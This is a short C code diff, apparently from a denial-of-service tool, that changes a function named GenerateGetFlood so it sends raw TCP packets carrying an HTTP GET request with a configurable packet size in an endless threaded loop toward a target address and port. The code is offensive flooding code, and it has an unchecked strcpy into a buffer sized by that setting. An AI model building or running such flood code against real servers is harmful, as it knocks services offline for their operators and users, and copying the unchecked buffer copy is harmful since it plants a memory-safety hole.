@@ -10,7 +10,7 @@
 #define GET_METHOD "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
 
 extern int g_num_threads;
-
+extern int g_packet_size;
 // session counting
 __u64 g_get_num_total;
 __u64 g_get_num_generated_in_sec;
@@ -43,6 +43,11 @@ void *GenerateGetFlood(void *data)
   int thread_id = *((int*) data);
   int sock = MakeRawSocket(IPPROTO_TCP);
   clock_t thread_clock;
+  
+  char get_data[g_packet_size];
+  
+  strcpy(get_data, GET_METHOD);
+  
   while (1) {
     // *** begin of critical section ***
     pthread_mutex_lock(&g_get_mutex);
@@ -70,8 +75,8 @@ void *GenerateGetFlood(void *data)
         inet_addr(g_get_now.dest),
         src_port,
         g_get_now.port,
-        GET_METHOD,
-        strlen(GET_METHOD),
+        get_data,
+        g_packet_size,
         seq,
         ack,
         0);
